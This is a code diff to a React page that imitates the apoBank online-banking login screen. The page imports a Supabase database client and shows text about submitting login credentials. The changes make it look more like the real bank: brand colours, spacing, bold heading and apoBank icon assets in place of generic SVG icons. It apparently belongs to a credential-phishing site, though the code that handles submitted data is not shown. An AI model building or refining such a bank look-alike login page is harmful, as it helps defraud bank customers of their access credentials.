@@ -4,11 +4,15 @@ import { supabase } from "@/integrations/supabase/client";
 import LoadingOverlay from "@/components/LoadingOverlay";
 import { usePageMeta } from "@/hooks/use-page-meta";
 import logoAsset from "@/assets/apobank-logo.svg.asset.json";
+import iconDatenschutz from "@/assets/apobank-icon-datenschutz.png.asset.json";
+import iconEmail from "@/assets/apobank-icon-email.png.asset.json";
+import iconPhone from "@/assets/apobank-icon-phone.png.asset.json";
 
 const FONT = "'TypoPRO Source Sans Pro', sans-serif";
 const PRIMARY = "#012169";
+const BTN = "#556a9a";
 const TEXT = "#1e325f";
-const BODY_BG = "#f8f9fa";
+const BODY_BG = "#F0F3F5";
 const LINK = "#555";
 const BORDER = "#ced4da";
 
@@ -60,7 +64,7 @@ const Apobank = () => {
 
       <main
         style={{
-          maxWidth: 940,
+          maxWidth: 820,
           margin: "0 auto",
           padding: "0 12px",
         }}
@@ -69,16 +73,16 @@ const Apobank = () => {
           style={{
             borderRadius: 4,
             overflow: "hidden",
-            boxShadow: "0 .125rem .25rem rgba(0,0,0,.075)",
+            boxShadow: "0 .5rem 1.25rem rgba(0,0,0,.18)",
           }}
         >
           {/* Header */}
-          <div style={{ background: "#fff", padding: "22px 32px" }}>
+          <div style={{ background: "#fff", padding: "22px 48px" }}>
             <h1
               style={{
                 color: PRIMARY,
                 fontSize: 40,
-                fontWeight: 500,
+                fontWeight: 700,
                 margin: 0,
                 lineHeight: 1.2,
               }}
@@ -88,7 +92,7 @@ const Apobank = () => {
           </div>
 
           {/* Body */}
-          <div style={{ background: BODY_BG, padding: "28px 32px 32px" }}>
+          <div style={{ background: BODY_BG, padding: "36px 48px 40px" }}>
             <div style={{ fontWeight: 600, marginBottom: 24 }}>
               Willkommen im Online-Banking der apoBank
             </div>
@@ -167,7 +171,7 @@ const Apobank = () => {
 
               <p style={{ marginTop: 4, marginBottom: 16 }}>
                 Mit dem Absenden Ihrer Anmeldedaten erkennen Sie die{" "}
-                <a href="#" target="_blank" rel="noopener noreferrer" style={{ color: LINK }}>
+                <a href="#" target="_blank" rel="noopener noreferrer" style={{ color: LINK, textDecoration: "underline" }}>
                   Sicherheitshinweise
                 </a>{" "}
                 an.
@@ -179,16 +183,16 @@ const Apobank = () => {
             </p>
 
             <div style={{ display: "flex", alignItems: "center", gap: 12, marginBottom: 16 }}>
-              <IconLock />
+              <img src={iconDatenschutz.url} alt="" width={28} height={28} />
               <span>1. Wir fragen niemals nach Ihren Zugangsdaten.</span>
             </div>
             <div style={{ display: "flex", alignItems: "center", gap: 12, marginBottom: 24 }}>
-              <IconMail />
+              <img src={iconEmail.url} alt="" width={28} height={28} />
               <span>2. Bei zweifelhaften E-Mails gilt: Keine Links oder Anhänge öffnen.</span>
             </div>
 
             <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 4 }}>
-              <IconPhone />
+              <img src={iconPhone.url} alt="" width={24} height={24} />
               <strong>+49 211 5998 8000</strong>
             </div>
             <a
@@ -207,8 +211,8 @@ const Apobank = () => {
           </div>
         </div>
 
-        <footer style={{ padding: "32px 0", textAlign: "center" }}>
-          <img src={logoAsset.url} alt="apoBank Logo" style={{ height: 56, width: "auto" }} />
+        <footer style={{ padding: "32px 0", display: "flex", alignItems: "center", justifyContent: "center" }}>
+          <img src={logoAsset.url} alt="apoBank Logo" style={{ height: 56, width: "auto", display: "block" }} />
         </footer>
       </main>
 
@@ -259,9 +263,9 @@ const Apobank = () => {
           font-size: 1rem;
           font-weight: 400;
           line-height: 1.5;
-          color: ${PRIMARY};
+          color: ${BTN};
           background-color: transparent;
-          border: 1px solid ${PRIMARY};
+          border: 1px solid ${BTN};
           border-radius: .25rem;
           cursor: pointer;
           font-family: inherit;
@@ -269,7 +273,8 @@ const Apobank = () => {
         }
         .apo-btn:hover:not(:disabled) {
           color: #fff;
-          background-color: ${PRIMARY};
+          background-color: ${BTN};
+          border-color: ${BTN};
         }
         .apo-btn:disabled {
           color: #6c757d;
@@ -287,28 +292,5 @@ const Apobank = () => {
     </div>
   );
 };
-
-const IconLock = () => (
-  <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#012169" strokeWidth="1.6" strokeLinecap="round" strokeLinejoin="round" aria-hidden>
-    <rect x="4" y="10" width="16" height="11" rx="1.5"/>
-    <path d="M8 10V7a4 4 0 0 1 8 0v3"/>
-    <circle cx="12" cy="15" r="1.2" fill="#012169" stroke="none"/>
-    <path d="M12 16v2"/>
-  </svg>
-);
-
-const IconMail = () => (
-  <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#012169" strokeWidth="1.6" strokeLinecap="round" strokeLinejoin="round" aria-hidden>
-    <rect x="3" y="5" width="18" height="14" rx="1.5"/>
-    <path d="M3 7l9 7 9-7"/>
-    <path d="M10 13.5c.4.4 1 .6 1.5.5l1-.2"/>
-  </svg>
-);
-
-const IconPhone = () => (
-  <svg width="24" height="24" viewBox="0 0 24 24" fill="#012169" aria-hidden>
-    <path d="M20.01 15.38c-1.23 0-2.42-.2-3.53-.56a.977.977 0 0 0-1.01.24l-1.57 1.97c-2.83-1.35-5.48-3.9-6.89-6.83l1.95-1.66c.27-.28.35-.67.24-1.02-.37-1.11-.56-2.3-.56-3.53 0-.54-.45-.99-.99-.99H4.19C3.65 3 3 3.24 3 3.99 3 13.28 10.73 21 20.01 21c.71 0 .99-.63.99-1.18v-3.45c0-.54-.45-.99-.99-.99z"/>
-  </svg>
-);
 
 export default Apobank;
